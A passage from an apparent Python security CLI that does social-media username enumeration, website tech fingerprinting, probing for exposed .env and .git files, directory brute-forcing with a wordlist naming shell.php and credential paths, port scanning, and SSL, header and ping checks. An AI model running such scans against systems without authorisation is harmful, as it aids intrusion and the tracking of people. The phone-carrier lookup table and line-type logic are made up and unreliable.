    "Reddit":     "https://www.reddit.com/user/{}",
    "YouTube":    "https://www.youtube.com/@{}",
    "LinkedIn":   "https://www.linkedin.com/in/{}",
    "Pinterest":  "https://www.pinterest.com/{}/",
    "TikTok":     "https://www.tiktok.com/@{}",
    "Snapchat":   "https://www.snapchat.com/add/{}",
    "Telegram":   "https://t.me/{}",
    "Medium":     "https://medium.com/@{}",
    "Dev.to":     "https://dev.to/{}",
    "Twitch":     "https://www.twitch.tv/{}",
    "Facebook":   "https://www.facebook.com/{}/",
    "Tumblr":     "https://{}.tumblr.com",
    "Patreon":    "https://www.patreon.com/{}",
    "Keybase":    "https://keybase.io/{}",
    "About.me":   "https://about.me/{}",
    "AngelList":  "https://angel.co/u/{}",
    "Behance":    "https://www.behance.net/{}",
    "Dribbble":   "https://dribbble.com/{}",
    "Flickr":     "https://www.flickr.com/people/{}/",
    "Vimeo":      "https://vimeo.com/{}",
    "SoundCloud": "https://soundcloud.com/{}",
    "Bandcamp":   "https://{}.bandcamp.com",
    "Replit":     "https://replit.com/@{}",
    "Codepen":    "https://codepen.io/{}",
    "HackerNews": "https://news.ycombinator.com/user?id={}",
    "ProductHunt": "https://www.producthunt.com/@{}",
    "BitBucket":  "https://bitbucket.org/{}/",
    "GitLab":     "https://gitlab.com/{}",
    "Steam":      "https://steamcommunity.com/id/{}/",
    "Spotify":    "https://open.spotify.com/user/{}",
    "Last.fm":    "https://www.last.fm/user/{}",
    "MySpace":    "https://myspace.com/{}",
    "Fiverr":     "https://www.fiverr.com/{}",
    "Upwork":     "https://www.upwork.com/freelancers/~{}",
    "Freelancer": "https://www.freelancer.com/u/{}",
    "GoodReads":  "https://www.goodreads.com/{}",
    "Wikipedia":  "https://en.wikipedia.org/wiki/User:{}",
    "Etsy":       "https://www.etsy.com/shop/{}",
    "Slideshare": "https://www.slideshare.net/{}",
    "Scribd":     "https://www.scribd.com/{}",
    "Issuu":      "https://issuu.com/{}",
    "HackerOne":  "https://hackerone.com/{}",
    "Bugcrowd":   "https://bugcrowd.com/{}",
    "Gravatar":   "https://en.gravatar.com/{}",
}


def osint_social():
    header_box("Social Media Username Search", Fore.YELLOW)
    username = input(f"  {c(f'Enter username to search {SYM_PROMPT} ', Fore.CYAN)}").strip()
    if not username:
        print(f"  {c('No username provided.', Fore.RED)}")
        return

    msg_username = f' for "{username}"'
    print(f"\n  {c(f'Searching {len(SOCIAL_PLATFORMS)} platforms{msg_username}...', Fore.CYAN)}")
    print(f"  {c(SYM_LINE_H*50, Fore.CYAN)}")

    found = 0
    for platform, url_template in SOCIAL_PLATFORMS.items():
        url = url_template.format(username)
        try:
            resp = requests.head(url, timeout=5, allow_redirects=True)
            if resp.status_code == 200:
                found += 1
                print(f"  {c(SYM_CHECK, Fore.GREEN)} {c(platform + ':', Fore.CYAN):16s} {c(url, Fore.GREEN)}")
        except Exception:
            pass

    print(f"\n  {c(SYM_CHECK + f' Found {found}/{len(SOCIAL_PLATFORMS)} profiles', Fore.GREEN)}")
    print()


# ═══ Website OSINT ═══

def osint_website():
    header_box("Website OSINT / Tech Recon", Fore.YELLOW)
    url = input(f"  {c(f'Enter URL {SYM_PROMPT} ', Fore.CYAN)}").strip()
    if not url:
        print(f"  {c('No URL provided.', Fore.RED)}")
        return
    if not url.startswith("http"):
        url = "https://" + url

    print(f"\n  {c('Analyzing website headers & tech stack...', Fore.CYAN)}")
    print(f"  {c(SYM_LINE_H*50, Fore.CYAN)}")

    try:
        resp = requests.get(url, timeout=10, headers={"User-Agent": "DarkieTester/1.3"}, allow_redirects=True)

        headers_info = []
        interesting_headers = [
            ("Server", "Server"),
            ("X-Powered-By", "Powered-By"),
            ("X-AspNet-Version", "ASP.NET Version"),
            ("X-Frame-Options", "Frame Options"),
            ("X-XSS-Protection", "XSS Protection"),
            ("X-Content-Type-Options", "Content-Type Options"),
            ("Content-Security-Policy", "CSP"),
            ("Strict-Transport-Security", "HSTS"),
            ("Set-Cookie", "Cookies (present)"),
            ("Access-Control-Allow-Origin", "CORS Origin"),
            ("CF-Ray", "Cloudflare Ray"),
            ("CF-Cache-Status", "Cloudflare Cache"),
        ]

        for header_key, label in interesting_headers:
            if header_key in resp.headers:
                val = resp.headers[header_key]
                if len(val) > 40:
                    val = val[:37] + "..."
                headers_info.append(f"  {label:20s}: {c(val, Fore.GREEN)}")

        info_lines = [
            f"  URL:         {c(resp.url, Fore.GREEN)}",
            f"  Status:      {c(str(resp.status_code), Fore.YELLOW)}",
            f"  Redirects:   {c(str(len(resp.history)), Fore.CYAN)}",
            f"  Size:        {c(f'{len(resp.content):,} bytes', Fore.MAGENTA)}",
            f"  Encoding:    {c(resp.encoding or 'N/A', Fore.CYAN)}",
        ]
        info_lines += headers_info

        info_box("HTTP Recon Results", info_lines, Fore.YELLOW)

        # Technology clues
        clues = []
        server = resp.headers.get("Server", "").lower()
        powered = resp.headers.get("X-Powered-By", "").lower()

        tech_map = {
            "nginx": "Nginx", "apache": "Apache", "iis": "IIS",
            "cloudflare": "Cloudflare", "cloudfront": "AWS CloudFront",
            "openresty": "OpenResty", "caddy": "Caddy", "tomcat": "Apache Tomcat",
            "jetty": "Eclipse Jetty", "gunicorn": "Gunicorn", "uwsgi": "uWSGI",
            "node.js": "Node.js", "express": "Express", "next.js": "Next.js",
            "php": "PHP", "python": "Python", "ruby": "Ruby", "java": "Java",
            "rails": "Ruby on Rails", "django": "Django", "flask": "Flask",
            "laravel": "Laravel", "symfony": "Symfony", "wordpress": "WordPress",
            "drupal": "Drupal", "joomla": "Joomla", "magento": "Magento",
            "shopify": "Shopify", "woocommerce": "WooCommerce",
            "asp.net": "ASP.NET", "waf": "WAF",
        }

        for keyword, tech_name in tech_map.items():
            if keyword in server or keyword in powered:
                clues.append(tech_name)

        # Check common paths
        common_paths = ["/wp-admin/", "/.env", "/robots.txt", "/sitemap.xml", "/.git/config", "/admin/"]
        for path in common_paths:
            try:
                pr = requests.get(url.rstrip('/') + path, timeout=5)
                if pr.status_code == 200:
                    clues.append(f"Exposed: {path}")
            except Exception:
                pass

        if clues:
            print(f"  {c('Technology Clues:', Fore.MAGENTA)}")
            for clue in set(clues):
                print(f"    {SYM_LINE_V}{SYM_LINE_H} {c(clue, Fore.YELLOW)}")

    except Exception as e:
        print(f"  {c(SYM_X + f' Error: {e}', Fore.RED)}")
    print()


# ═══ Whois Lookup ═══

def osint_whois():
    header_box("Whois Domain Lookup", Fore.YELLOW)
    domain = input(f"  {c(f'Enter domain {SYM_PROMPT} ', Fore.CYAN)}").strip().lower()
    if not domain:
        print(f"  {c('No domain provided.', Fore.RED)}")
        return

    print(f"\n  {c('Running whois lookup...', Fore.CYAN)}")
    print(f"  {c(SYM_LINE_H*50, Fore.CYAN)}")

    has_whois = shutil.which("whois") is not None
    if has_whois:
        try:
            r = subprocess.run(["whois", domain], capture_output=True, text=True, timeout=30)
            out = r.stdout
            interesting = []
            for line in out.splitlines():
                line_lower = line.lower().strip()
                for key in ["domain name", "registrar", "creation date", "expir", "registrant", "admin", "name server", "dnssec", "status"]:
                    if line_lower.startswith(key):
                        interesting.append(line.strip())
                        break
            if interesting:
                for line in interesting[:20]:
                    print(f"  {c(line, Fore.GREEN)}")
            else:
                print(f"  {c('Raw whois output:', Fore.YELLOW)}")
                for line in out.splitlines()[:25]:
                    print(f"  {Fore.GREEN}{line}{Style.RESET_ALL}")
        except Exception as e:
            print(f"  {c(SYM_X + f' Whois error: {e}', Fore.RED)}")
    else:
        print(f"  {c('whois command not found.', Fore.YELLOW)}")
        print(f"  {c('Visit:', Fore.CYAN)} https://www.whois.com/whois/{domain}")
    print()


# ═══ Web Recon & Pentest ═══

WEB_PATH_WORDLIST = [
    "admin", "login", "wp-admin", "wp-login", "administrator", "dashboard",
    "api", "v1", "v2", "graphql", "api/v1", "api/v2",
    ".env", ".git/config", ".git/HEAD", ".htaccess", "robots.txt", "sitemap.xml",
    "backup", "db", "database", "dump", "sql", "mysql", "phpmyadmin",
    "config", "configuration", "settings", "setup", "install", "install.php",
    "wp-content", "wp-includes", "wp-json", "wp-admin/admin-ajax.php",
    "uploads", "download", "files", "assets", "static", "public",
    "images", "img", "css", "js", "scripts", "storage",
    "server-status", "server-info", "cgi-bin", "cgi-bin/test.cgi",
    "test", "testing", "dev", "development", "staging", "stage",
    "debug", "log", "logs", "error", "errors", "trace",
    "phpinfo.php", "info.php", "test.php", "shell.php", "cmd.php",
    ".DS_Store", "Thumbs.db", "crossdomain.xml", "clientaccesspolicy.xml",
    "web.config", "application.properties", "env", ".env.example",
    "composer.json", "package.json", "Dockerfile", "docker-compose.yml",
    "README.md", "CHANGELOG.md", "LICENSE", "LICENSE.txt",
    "swagger.json", "swagger-ui", "openapi.json", "docs", "documentation",
    "proxy", "vpn", "remote", "rdp", "ssh", "shell",
    "panel", "cpanel", "whm", "webmail", "mail",
    "status", "health", "healthcheck", "healthz", "readyz",
    "metrics", "monitor", "prometheus", "grafana", "kibana",
    "jenkins", "jira", "confluence", "sonar", "nexus",
    ".aws", ".azure", ".gcp", "cloud", "credentials",
    "token", "tokens", "keys", "secret", "secrets", "password",
    "register", "signup", "sign-up", "account", "accounts",
    "user", "users", "profile", "profiles", "me",
    "search", "query", "filter", "sort", "page",
    "index.php", "index.html", "default.php", "default.aspx",
    "xmlrpc.php", "xmlrpc", "actuator", "actuator/health",
    ".well-known/security.txt", ".well-known/acme-challenge",
    "vendor", "node_modules", "bower_components",
    "webalizer", "stats", "statistics", "awstats",
]

WEB_PATH_WORDLIST = list(dict.fromkeys(WEB_PATH_WORDLIST))


def web_recon():
    header_box("Web Recon & Pentest", Fore.YELLOW)
    target = input(f"  {c(f'Enter domain or URL (e.g. example.com) {SYM_PROMPT} ', Fore.CYAN)}").strip().lower()
    if not target:
        print(f"  {c('No target provided.', Fore.RED)}")
        return

    target = target.rstrip('/')
    if not target.startswith("http"):
        target = "https://" + target

    parsed = urlparse(target)
    domain = parsed.netloc or parsed.path
    if domain.startswith("www."):
        domain = domain[4:]

    print(f"\n  {c('Target:', Fore.GREEN)} {target}")
    print(f"  {c('Domain:', Fore.CYAN)} {domain}")
    print(f"  {c(SYM_LINE_H*50, Fore.CYAN)}")

    # ── Phase 1: Port Scan with nmap ──
    print(f"\n  {c('Phase 1: Port Scan', Fore.MAGENTA)}")
    print(f"  {c('─'*40, Fore.MAGENTA)}")
    has_nmap = shutil.which("nmap") is not None
    open_ports = []
    if has_nmap:
        try:
            result = subprocess.run(
                ["nmap", "-T4", "-F", "--open", domain],
                capture_output=True, text=True, timeout=120
            )
            for line in result.stdout.splitlines():
                m = re.match(r'^(\d+)/tcp\s+open', line)
                if m:
                    port = int(m.group(1))
                    svc = ""
                    try:
                        svc = socket.getservbyport(port)
                    except OSError:
                        svc = "unknown"
                    open_ports.append((port, svc))
                    print(f"    {SYM_LINE_V}{SYM_LINE_H} {Fore.GREEN}{port}{Style.RESET_ALL} ({Fore.CYAN}{svc}{Style.RESET_ALL})")
        except Exception as e:
            print(f"    {c(f'nmap skipped: {e}', Fore.YELLOW)}")

    if not open_ports:
        print(f"    {c('No open ports found via nmap. Trying basic connect scan...', Fore.YELLOW)}")
        for port, svc_name in [(80, "http"), (443, "https"), (8080, "http-proxy"), (8443, "https-alt")]:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(2)
                result = sock.connect_ex((domain, port))
                sock.close()
                if result == 0:
                    open_ports.append((port, svc_name))
                    print(f"    {SYM_LINE_V}{SYM_LINE_H} {Fore.GREEN}{port}{Style.RESET_ALL} ({Fore.CYAN}{svc_name}{Style.RESET_ALL})")
            except Exception:
                pass

    if not has_nmap:
        print(f"    {c('nmap not installed. Install for deeper scanning.', Fore.YELLOW)}")

    # ── Phase 2: Web Path Discovery ──
    print(f"\n  {c('Phase 2: Directory/File Brute-Force', Fore.MAGENTA)}")
    print(f"  {c(f'Wordlist: {len(WEB_PATH_WORDLIST)} paths', Fore.CYAN)}")
    print(f"  {c('─'*40, Fore.MAGENTA)}")

    found_paths = []
    base_url = f"https://{domain}"
    # Check which protocol works
    for proto_url in [f"https://{domain}", f"http://{domain}"]:
        try:
            r = requests.get(proto_url, timeout=5, headers={"User-Agent": "DarkieTester/1.3"})
            if r.status_code < 500:
                base_url = proto_url
                break
        except Exception:
            continue

    total = len(WEB_PATH_WORDLIST)
    batch_size = 20

    for i in range(0, total, batch_size):
        batch = WEB_PATH_WORDLIST[i:i + batch_size]
        for path in batch:
            url = f"{base_url.rstrip('/')}/{path}"
            try:
                r = requests.get(url, timeout=4, headers={"User-Agent": "DarkieTester/1.3"}, allow_redirects=False)
                if r.status_code in (200, 301, 302, 403, 401, 500):
                    status_color = Fore.GREEN if r.status_code == 200 else Fore.YELLOW if r.status_code in (301, 302) else Fore.RED
                    size = len(r.content)
                    found_paths.append((path, r.status_code, size))
                    print(f"    {c(f'[{r.status_code}]', status_color)} {c(f'{size:>7,}B', Fore.CYAN)}  {c(url, Fore.GREEN)}")
            except Exception:
                pass
        sys.stdout.write(f"\r    {c(f'Progress: {min(i+batch_size, total)}/{total}', Fore.CYAN)}  {c(f'Found: {len(found_paths)}', Fore.GREEN)}  ")
        sys.stdout.flush()

    print(f"\n\n  {c(f'Total paths discovered: {len(found_paths)}', Fore.GREEN)}")

    # ── Phase 3: Security Checks ──
    print(f"\n  {c('Phase 3: Security Checks', Fore.MAGENTA)}")
    print(f"  {c('─'*40, Fore.MAGENTA)}")

    # HTTP methods check
    try:
        r = requests.options(base_url, timeout=5, headers={"User-Agent": "DarkieTester/1.3"})
        allow = r.headers.get("Allow", r.headers.get("Access-Control-Allow-Methods", ""))
        if allow:
            methods = [m.strip() for m in allow.split(",")]
            print(f"    {c('Allowed HTTP Methods:', Fore.CYAN)} {c(', '.join(methods), Fore.GREEN)}")
            dangerous = [m for m in methods if m.upper() in ("PUT", "DELETE", "TRACE", "CONNECT", "PATCH")]
            if dangerous:
                dangerous_str = ", ".join(dangerous)
                print(f"    {c(SYM_WARN + f' Dangerous methods enabled: {dangerous_str}', Fore.RED)}")
    except Exception:
        print(f"    {c('OPTIONS request failed', Fore.YELLOW)}")

    # Security headers
    try:
        r = requests.get(base_url, timeout=5, headers={"User-Agent": "DarkieTester/1.3"})
        sec_headers = {
            "Strict-Transport-Security": "HSTS",
            "Content-Security-Policy": "CSP",
            "X-Frame-Options": "XFO",
            "X-Content-Type-Options": "XCTO",
            "X-XSS-Protection": "XXSS",
        }
        missing = []
        present = []
        for hdr, name in sec_headers.items():
            if hdr in r.headers:
                present.append(name)
            else:
                missing.append(name)
        if present:
            print(f"    {c('Present Headers:', Fore.GREEN)} {', '.join(present)}")
        if missing:
            print(f"    {c('Missing Headers:', Fore.RED)} {', '.join(missing)}")
    except Exception:
        pass

    # SSL check
    if base_url.startswith("https"):
        try:
            ctx = ssl.create_default_context()
            with socket.create_connection((domain, 443), timeout=5) as sock:
                with ctx.wrap_socket(sock, server_hostname=domain) as ssock:
                    cert = ssock.getpeercert()
            if cert:
                not_after = cert.get("notAfter", "")
                if not_after:
                    try:
                        expiry = datetime.strptime(not_after, "%b %d %H:%M:%S %Y %Z")
                        days_left = (expiry - datetime.now()).days
                        if days_left < 0:
                            print(f"    {c(SYM_X + ' SSL Certificate: EXPIRED', Fore.RED)}")
                        elif days_left < 30:
                            print(f"    {c(SYM_WARN + f' SSL: Expiring in {days_left} days', Fore.YELLOW)}")
                        else:
                            print(f"    {c(SYM_CHECK + f' SSL: Valid ({days_left} days)', Fore.GREEN)}")
                    except Exception:
                        pass
        except Exception:
            print(f"    {c('SSL: Could not connect securely', Fore.RED)}")

    # ── Summary ──
    print(f"\n  {c('─'*50, Fore.MAGENTA)}")
    print(f"  {c('Recon Complete:', Fore.GREEN)}")
    print(f"    Open Ports:  {c(str(len(open_ports)), Fore.CYAN)}")
    print(f"    Paths Found: {c(str(len(found_paths)), Fore.CYAN)}")
    if found_paths:
        print(f"    Interesting Paths:")
        for path, code, size in found_paths[:10]:
            print(f"      {c(f'/{path}', Fore.GREEN)} {c(f'[{code}]', Fore.YELLOW)} {c(f'({size:,}B)', Fore.CYAN)}")
        if len(found_paths) > 10:
            print(f"      {c(f'... and {len(found_paths)-10} more', Fore.DIM)}")
    print()


# ──────────────────────────────────────────────────────
#  SECTION 3: TELEPHONE TOOLS
# ──────────────────────────────────────────────────────

CARRIER_DB = {
    "310": "Verizon Wireless", "311": "Verizon Wireless", "312": "Verizon Wireless",
    "313": "Verizon Wireless", "314": "Verizon Wireless", "315": "Verizon Wireless",
    "316": "Verizon Wireless", "317": "Verizon Wireless", "318": "Verizon Wireless",
    "319": "Verizon Wireless", "320": "T-Mobile USA", "321": "T-Mobile USA",
    "322": "T-Mobile USA", "323": "T-Mobile USA", "324": "T-Mobile USA",
    "325": "T-Mobile USA", "326": "T-Mobile USA", "327": "T-Mobile USA",
    "328": "T-Mobile USA", "329": "T-Mobile USA", "330": "AT&T Wireless",
    "331": "AT&T Wireless", "332": "AT&T Wireless", "333": "AT&T Wireless",
    "334": "AT&T Wireless", "335": "AT&T Wireless", "336": "AT&T Wireless",
    "337": "AT&T Wireless", "338": "AT&T Wireless", "339": "AT&T Wireless",
    "340": "Sprint Corporation", "341": "Sprint Corporation",
    "342": "Sprint Corporation", "343": "Sprint Corporation",
    "344": "Sprint Corporation", "345": "Sprint Corporation",
}


def tel_analyze():
    header_box("Telephone Number Analysis", Fore.MAGENTA)
    number = input(f"  {c(f'Enter phone number (with country code) {SYM_PROMPT} ', Fore.CYAN)}").strip()
    if not number:
        print(f"  {c('No number provided.', Fore.RED)}")
        return

    cleaned = re.sub(r'[^\d+]', '', number)
    if not cleaned.startswith('+'):
        cleaned = '+' + cleaned

    print(f"\n  {c('Analyzing number...', Fore.CYAN)}")
    print(f"  {c(SYM_LINE_H*50, Fore.CYAN)}")

    digits = cleaned.lstrip('+')
    detected_country = "Unknown"
    for code, country in sorted(COUNTRY_CODES.items(), key=lambda x: -len(x[0])):
        if cleaned.startswith('+' + code):
            detected_country = country
            break

    info_lines = [
        f"  Raw:         {c(cleaned, Fore.GREEN)}",
        f"  Digits:      {c(str(len(digits)), Fore.CYAN)}",
        f"  Country:     {c(detected_country, Fore.YELLOW)}",
    ]

    # US carrier detection
    if detected_country == "US/CA" and len(digits) == 11:
        npa = digits[1:4]
        nxx = digits[4:7]
        carrier = CARRIER_DB.get(npa, CARRIER_DB.get(nxx, "Unknown/Regional Carrier"))
        info_lines.append(f"  Area Code:   {c(npa, Fore.MAGENTA)} (NPA)")
        info_lines.append(f"  Exchange:    {c(nxx, Fore.MAGENTA)} (NXX)")
        info_lines.append(f"  Carrier:     {c(carrier, Fore.CYAN)}")
        info_lines.append(f"  Line Type:   {c('Mobile (NXX 200-999)', Fore.GREEN) if nxx.startswith(('2', '3', '4', '5', '6', '7', '8', '9')) else c('Landline/VoIP', Fore.YELLOW)}")

    # Format validation
    if len(digits) >= 7:
        info_lines.append(f"  Valid:       {c(SYM_CHECK + ' Yes', Fore.GREEN)}")
    else:
        info_lines.append(f"  Valid:       {c(SYM_X + ' No (too few digits)', Fore.RED)}")

    info_box("Telephone Analysis", info_lines, Fore.MAGENTA)
    print()


def tel_country_codes():
    header_box("Country Code Reference", Fore.MAGENTA)
    print(f"  {c(f'Total: {len(COUNTRY_CODES)} countries listed', Fore.CYAN)}")
    print(f"  {c(SYM_LINE_H*50, Fore.CYAN)}")
    for code, country in sorted(COUNTRY_CODES.items(), key=lambda x: int(x[0])):
        print(f"    +{code:4s}  {c(country, Fore.GREEN)}")
    print()


def tel_format():
    header_box("Phone Number Formatter", Fore.MAGENTA)
    number = input(f"  {c(f'Enter raw number {SYM_PROMPT} ', Fore.CYAN)}").strip()
    if not number:
        print(f"  {c('No number provided.', Fore.RED)}")
        return

    digits_only = re.sub(r'[^\d]', '', number)
    has_plus = number.strip().startswith('+')

    formats = [
        (f"Raw digits:    {digits_only}"),
        (f"International: +{digits_only}"),
    ]

    if len(digits_only) == 11 and digits_only.startswith('1'):
        formats.append(f"US Format:     +1 ({digits_only[1:4]}) {digits_only[4:7]}-{digits_only[7:]}")
    elif len(digits_only) == 10:
        formats.append(f"US Format:     ({digits_only[:3]}) {digits_only[3:6]}-{digits_only[6:]}")

    if len(digits_only) >= 7:
        last4 = digits_only[-4:]
        rest = digits_only[:-4]
        formats.append(f"Masked:        {rest[:3]}***{last4}")

    print(f"\n  {c('Formats:', Fore.CYAN)}")
    for fmt in formats:
        print(f"    {c(SYM_LINE_V + SYM_LINE_H, Fore.CYAN)} {c(fmt, Fore.GREEN)}")
    print()


# ──────────────────────────────────────────────────────
#  SECTION 4: NETWORK UTILITIES
# ──────────────────────────────────────────────────────

def net_portscan():
    header_box("TCP Port Scanner", Fore.BLUE)
    target = input(f"  {c(f'Enter IP or domain {SYM_PROMPT} ', Fore.CYAN)}").strip()
    if not target:
        print(f"  {c('No target provided.', Fore.RED)}")
        return

    try:
        socket.inet_aton(target)
        ip = target
    except OSError:
        try:
            ip = socket.gethostbyname(target)
            print(f"  {c(SYM_CHECK + ' Resolved:', Fore.GREEN)} {target} {SYM_ARROW} {ip}")
        except Exception:
            print(f"  {c(SYM_X + ' Could not resolve.', Fore.RED)}")
            return

    print(f"\n  {c('Select scan range:', Fore.CYAN)}")
    print(f"  {c('[1]', Fore.GREEN)}  Top 100 ports (fast)")
    print(f"  {c('[2]', Fore.GREEN)}  Top 1000 ports")
    print(f"  {c('[3]', Fore.GREEN)}  Custom range")
    scan_choice = input(f"  {c(f'Choice {SYM_PROMPT} ', Fore.CYAN)}").strip()

    if scan_choice == "1":
        ports = [22, 21, 23, 25, 53, 80, 110, 111, 135, 139, 143, 443, 445, 993, 995, 1433, 1521, 2049, 3306, 3389, 5432, 5900, 5985, 5986, 6379, 8080, 8443, 9000, 9090, 27017]
    elif scan_choice == "2":
        ports = list(range(1, 1025))
    elif scan_choice == "3":
        range_input = input(f"  {c(f'Port range (e.g. 1-1000) {SYM_PROMPT} ', Fore.CYAN)}").strip()
        try:
            parts = range_input.split("-")
            start = int(parts[0])
            end = int(parts[1]) if len(parts) > 1 else start
            ports = list(range(start, end + 1))
        except Exception:
            print(f"  {c('Invalid range. Using top 100.', Fore.RED)}")
            ports = [22, 80, 443, 8080, 8443, 3306, 5432, 6379, 27017]
    else:
        ports = [22, 80, 443, 8080, 8443, 3306, 5432, 6379, 27017]

    print(f"\n  {c(f'Scanning {ip} on {len(ports)} ports...', Fore.CYAN)}")
    print(f"  {c(SYM_LINE_H*50, Fore.CYAN)}")

    open_ports = []
    total = len(ports)
    done = 0

    def _scan_worker(port, results, idx):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(1.5)
            result = sock.connect_ex((ip, port))
            sock.close()
            if result == 0:
                results[idx] = port
            else:
                results[idx] = None
        except Exception:
            results[idx] = None

    batch_size = 100
    for i in range(0, total, batch_size):
        batch = ports[i:i + batch_size]
        batch_results = {}
        with ThreadPoolExecutor(max_workers=100) as executor:
            futures = {executor.submit(_scan_worker, p, batch_results, j): j for j, p in enumerate(batch)}
            for f in as_completed(futures):
                f.result()
        for idx in batch_results:
            if batch_results[idx] is not None:
                open_ports.append(batch_results[idx])
            done += 1
        sys.stdout.write(f"\r  {c(f'Progress: {done}/{total}', Fore.CYAN)}  |  {c(f'Open: {len(open_ports)}', Fore.GREEN)}")
        sys.stdout.flush()

    print(f"\n\n  {c(SYM_CHECK + f' Scan complete. {len(open_ports)}/{total} ports open', Fore.GREEN)}")
    if open_ports:
        for p in sorted(open_ports):
            try:
                svc = socket.getservbyport(p)
            except OSError:
                svc = "unknown"
            print(f"    {SYM_LINE_V}{SYM_LINE_H} {Fore.GREEN}{p}{Style.RESET_ALL} ({Fore.CYAN}{svc}{Style.RESET_ALL})")
    print()


def net_sslcheck():
    header_box("SSL/TLS Certificate Checker", Fore.BLUE)
    domain = input(f"  {c(f'Enter domain {SYM_PROMPT} ', Fore.CYAN)}").strip().lower()
    if not domain:
        print(f"  {c('No domain provided.', Fore.RED)}")
        return

    port = 443
    port_input = input(f"  {c(f'Port (default 443) {SYM_PROMPT} ', Fore.CYAN)}").strip()
    if port_input.isdigit():
        port = int(port_input)

    print(f"\n  {c(f'Connecting to {domain}:{port}...', Fore.CYAN)}")
    print(f"  {c(SYM_LINE_H*50, Fore.CYAN)}")

    try:
        ctx = ssl.create_default_context()
        with socket.create_connection((domain, port), timeout=10) as sock:
            with ctx.wrap_socket(sock, server_hostname=domain) as ssock:
                cert = ssock.getpeercert()

        info_lines = [
            f"  Domain:      {c(domain, Fore.GREEN)}",
            f"  Port:        {c(str(port), Fore.CYAN)}",
        ]

        if cert:
            subject = dict(x[0] for x in cert.get("subject", []))
            issuer = dict(x[0] for x in cert.get("issuer", []))
            info_lines.append(f"  Subject:     {c(subject.get('commonName', 'N/A'), Fore.GREEN)}")
            info_lines.append(f"  Issuer:      {c(issuer.get('organizationName', 'N/A'), Fore.YELLOW)}")
            info_lines.append(f"  Valid From:  {c(cert.get('notBefore', 'N/A'), Fore.CYAN)}")
            info_lines.append(f"  Valid Until: {c(cert.get('notAfter', 'N/A'), Fore.MAGENTA)}")

            # Expiry check
            not_after = cert.get('notAfter', '')
            if not_after:
                try:
                    expiry = datetime.strptime(not_after, "%b %d %H:%M:%S %Y %Z")
                    days_left = (expiry - datetime.now()).days
                    if days_left < 0:
                        info_lines.append(f"  Status:      {c('EXPIRED', Fore.RED)}")
                    elif days_left < 30:
                        info_lines.append(f"  Status:      {c(f'Expiring in {days_left} days', Fore.YELLOW)}")
                    else:
                        info_lines.append(f"  Status:      {c(f'Valid ({days_left} days remaining)', Fore.GREEN)}")
                except Exception:
                    pass

            san = cert.get("subjectAltName", [])
            if san:
                domains = [v for k, v in san if k == "DNS"]
                info_lines.append(f"  SANs:        {c(', '.join(domains[:5]), Fore.CYAN)}")
                if len(domains) > 5:
                    info_lines.append(f"               {c(f'... and {len(domains)-5} more', Fore.DIM)}")

            info_box("SSL/TLS Certificate", info_lines, Fore.BLUE)
        else:
            print(f"  {c('No certificate returned.', Fore.RED)}")
    except ssl.SSLCertVerificationError:
        print(f"  {c(SYM_X + ' Certificate verification failed.', Fore.RED)}")
    except Exception as e:
        print(f"  {c(SYM_X + f' Error: {e}', Fore.RED)}")
    print()


def net_httpheaders():
    header_box("HTTP Security Headers Analyzer", Fore.BLUE)
    url = input(f"  {c(f'Enter URL {SYM_PROMPT} ', Fore.CYAN)}").strip()
    if not url:
        print(f"  {c('No URL provided.', Fore.RED)}")
        return
    if not url.startswith("http"):
        url = "https://" + url

    print(f"\n  {c('Fetching headers...', Fore.CYAN)}")
    print(f"  {c(SYM_LINE_H*50, Fore.CYAN)}")

    try:
        resp = requests.get(url, timeout=10, headers={"User-Agent": "DarkieTester/1.3"})

        info_lines = [
            f"  URL:         {c(resp.url, Fore.GREEN)}",
            f"  Status:      {c(str(resp.status_code), Fore.YELLOW)}",
        ]

        security_headers = {
            "Strict-Transport-Security": ("HSTS", "Enforces HTTPS connections"),
            "Content-Security-Policy": ("CSP", "Controls resource loading"),
            "X-Frame-Options": ("XFO", "Prevents clickjacking"),
            "X-Content-Type-Options": ("XCTO", "Prevents MIME sniffing"),
            "X-XSS-Protection": ("XXSS", "Cross-site scripting filter"),
            "Referrer-Policy": ("Referrer", "Controls referrer info"),
            "Permissions-Policy": ("Permissions", "Controls browser features"),
            "Access-Control-Allow-Origin": ("CORS", "Cross-origin resource sharing"),
            "X-Powered-By": ("Powered By", "Reveals tech stack"),
            "Server": ("Server", "Reveals server software"),
        }

        for header, (short, desc) in security_headers.items():
            if header in resp.headers:
                val = resp.headers[header]
                if len(val) > 50:
                    val = val[:47] + "..."
                info_lines.append(f"  {short:12s}: {c(val, Fore.GREEN)}  {c_dim(desc, Fore.WHITE)}")
            else:
                info_lines.append(f"  {short:12s}: {c('Not set', Fore.RED)}  {c_dim(f'Missing: {desc}', Fore.WHITE)}")

        info_box("Security Headers Report", info_lines, Fore.BLUE)

        # Rating
        present = sum(1 for h in security_headers if h in resp.headers)
        rating = present / len(security_headers) * 100
        if rating >= 70:
            grade = c(f"Grade: A ({rating:.0f}%)", Fore.GREEN)
        elif rating >= 40:
            grade = c(f"Grade: C ({rating:.0f}%)", Fore.YELLOW)
        else:
            grade = c(f"Grade: F ({rating:.0f}%)", Fore.RED)
        print(f"  {c('Security Rating:', Fore.CYAN)} {grade}")
    except Exception as e:
        print(f"  {c(SYM_X + f' Error: {e}', Fore.RED)}")
    print()


def net_ping():
    header_box("Ping Sweep", Fore.BLUE)
    target = input(f"  {c(f'Enter IP or domain {SYM_PROMPT} ', Fore.CYAN)}").strip()
    if not target:
        print(f"  {c('No target provided.', Fore.RED)}")
        return

    count = input(f"  {c(f'Ping count (default 4) {SYM_PROMPT} ', Fore.CYAN)}").strip()
    count = int(count) if count.isdigit() else 4

    print(f"\n  {c(f'Pinging {target} ({count} packets)...', Fore.CYAN)}")
    print(f"  {c(SYM_LINE_H*50, Fore.CYAN)}")

    param = "-n" if platform.system().lower() == "windows" else "-c"
    try:
        r = subprocess.run(["ping", param, str(count), target], capture_output=True, text=True, timeout=30)
        output = r.stdout or r.stderr

        # Parse stats
        stats_lines = []
        for line in output.splitlines():
            line_s = line.strip()
            if any(x in line_s.lower() for x in ["round-trip", "rtt", "min/avg/max", "packets sent", "statistics", "transmitted", "received", "loss", "ttl=", "time=", "time<"]):
                stats_lines.append(line_s)

        if stats_lines:
            for line in stats_lines:
                print(f"  {c(line, Fore.GREEN)}")
        else:
            print(f"  {c('Raw ping output:', Fore.YELLOW)}")
            for line in output.splitlines()[:10]:
